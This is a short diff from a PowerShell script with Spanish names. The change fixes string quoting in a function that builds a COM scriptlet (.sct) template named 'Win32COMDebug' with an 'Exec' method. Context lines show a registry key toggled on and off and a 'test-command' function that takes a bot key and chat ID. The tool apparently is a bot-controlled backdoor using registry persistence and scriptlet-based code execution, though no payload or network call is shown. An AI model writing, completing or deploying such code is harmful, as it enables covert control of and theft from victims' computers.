@@ -237,7 +237,7 @@ if ($Activar -eq "No") {Remove-ItemProperty $ruta_key -Name $key  -Force | Out-N
 }
 
 function crea_plantilla_sct {param ($code)
-$plantilla_sct = @<?XML version="1.0"?>
+$plantilla_sct = '<?XML version="1.0"?>
 <scriptlet>
 <registration
 description="Win32COMDebug"
@@ -254,7 +254,7 @@ classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
 <public>
     <method name="Exec"></method>
 </public>
-</scriptlet>'@
+</scriptlet>'
 return $plantilla_sct}
 
 function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
